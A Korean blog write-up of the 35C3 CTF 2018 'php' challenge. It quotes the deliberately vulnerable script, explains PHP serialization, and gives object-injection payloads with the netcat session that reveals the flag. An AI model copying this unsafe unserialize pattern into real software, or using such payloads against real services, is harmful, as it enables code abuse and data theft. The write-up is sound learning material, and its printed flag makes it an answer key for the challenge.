---
title: "[35C3 CTF 2018] php Write up"
date: 2018-12-30
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, 35C3CTF2018]
---

어제 ctftime을 돌아보다가 `35C3 CTF`가 하고 있길래 한 문제를 풀어보았다.
원래 몇개 더 풀어보고 싶었는데 어떻게 푸는건지를 모르겠다.
아직 Write up이 안올라왔던데, 나중에 올라오면 찾아봐야겠다.  

<!--more-->

일단 `php` 문제 정보는 다음과 같다.  

```plain
PHP's unserialization mechanism can be exceptional. Guest challenge by jvoisin.

Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1
```

파일을 다운받아 압축을 풀어보면 `php.php` 파일을 확인할 수 있다.
`php.php`의 내용은 다음과 같다.  

```php
<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;
```

`STDIN`으로 입력 값을 받아 `$line`에 저장한 후, 이를 `unserialize` 함수를 통해 `unserialize` 한 값을 `$a`에 저장한다.
마지막으로 `$a`를 출력 해 준다.
그런데 위를 살펴보면 `B`라는 `class`가 선언되어 있고, `__destruct` 함수 안에 `$flag`함수를 출력 해 준다.
아무래도 `unserialize` 함수의 취약점(?)을 가지고 푸는 문제인 것 같아 일단 `unserialize`함수가 무엇인지를 찾아보았다.  

### serialize()  
```
PHP 변수들을 string으로 만들어 주는 함수  
ex) serialize(array(3, 4, 5, 6)) => a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}  
a:4 => 배열의 크기는 4  
object 일 경우 O:object_name_length:"object_name":object_size:  
ex) O:8:"stdclass":8:  
i:0;i:3 => 배열 첫 번째 인덱스의 값은 3  
int가 아닌 string 형태 일 경우 s:string_length:"string";    
ex) s:3:"one";
```

### unserialize()  
```
serialize 된 변수를 PHP 값으로 변환  
ex) unserialize(a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}) => Array([0] => 3 [1] => 4 [2] => 5 [3] => 6)  
```

그런데 찾아보다 보니, 아래와 같은 블로그를 찾을 수 있었다.  

> [http://qkqhxla1.tistory.com/444](http://qkqhxla1.tistory.com/444)

`php object injection`에 대한 설명인데, 취약점 exploit을 위한 아래의 두 가지 조건이 `php` 문제와 정확히 일치한다.  

1. 어플리케이션은 php의 매직 메소드(__wakeup이나 destrust 같은)를 구현한 클래스를 가지고 있어야 한다.  
2. 공격중의 모든 클래스들은 취약한 unserialize()가 호출되기 전에 선언되어야 한다.  

그래서 아래와 같이 입력 해 보았다.  

```plain
O:1:"B":1{s:4:"flag";s:5:"/flag";}
```

그러면 `B` 클래스에 `flag`라는 이름으로 `/flag`를 할당하고 `__destruct` 메소드를 호출하며 `echo $flag`를 실행 할 것이다.
문제에 접속하여 위와 같이 입력 했더니 flag를 읽을 수 있었다!  

```sh
$ nc 35.242.207.13 1
O:1:"B":1{s:4:"flag";s:5:"/flag";}
35C3_php_is_fun_php_is_fun
PHP Fatal error:  Uncaught Exception: Well that was unexpected… in /home/user/php.php:16
Stack trace:
#0 {main}
  thrown in /home/user/php.php on line 16
```

그런데 이 문제 다시 생각 해 보니 어찌됬든 `__destruct` 메소드만 호출하도록 하면 되서 굳이 내가 한 방식 말고 `O:1:"B":1:{}` 이런식으로 해도 문제가 풀릴 것 같다.
근데 뭐 풀었으니 됬다 ㅎㅎㅎ  

```plain
35C3_php_is_fun_php_is_fun
```
